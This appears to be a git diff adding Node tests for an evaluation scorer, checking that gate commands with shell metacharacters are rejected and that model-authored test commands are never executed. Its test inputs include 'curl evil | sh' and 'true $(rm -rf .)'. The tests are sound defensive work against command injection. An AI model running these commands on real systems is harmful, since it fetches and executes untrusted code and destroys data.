@@ -1,7 +1,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { score, overlaps, scoreArtifacts, scoreRemediation } from '../evals/scripts/score-eval.mjs';
-import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from 'node:fs';
+import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
 import { execFileSync } from 'node:child_process';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -299,4 +299,24 @@ test('scoreRemediation keeps note_not_broken when the signature test still passe
     hiddenTestOutput: 'test merge_config_public_signature_is_unchanged ... ok\ntest other ... FAILED\n',
   });
   assert.equal(r.note_not_broken, true);
+});
+
+// Self-audit 2026-08-28: eval-scorer-shells-out-model-authored-test-command
+import { splitGateCommand } from '../evals/scripts/score-eval.mjs';
+
+test('splitGateCommand yields argv and rejects shell metacharacters', () => {
+  assert.deepEqual(splitGateCommand('  cargo nextest run --workspace '), ['cargo', 'nextest', 'run', '--workspace']);
+  assert.throws(() => splitGateCommand('just test; curl evil | sh'), /shell metacharacters/);
+  assert.throws(() => splitGateCommand('true $(rm -rf .)'), /shell metacharacters/);
+  assert.throws(() => splitGateCommand('   '), /empty/);
+});
+
+test('scoreRemediation never executes recon.testing.command', () => {
+  const { repo, dir } = remediationRepo();
+  const canary = join(repo, 'CANARY');
+  const reconPath = join(dir, 'recon.yaml');
+  writeFileSync(reconPath, YAML.stringify({ testing: { runner: 'sh', command: `touch ${canary}`, sources: ['model'] } }));
+  const r = scoreRemediation({ auditDir: dir, repoRoot: repo, remediation: {} });
+  assert.equal(existsSync(canary), false, 'model-authored command was executed');
+  assert.equal(r.workspace_gate_pass, false);
 });
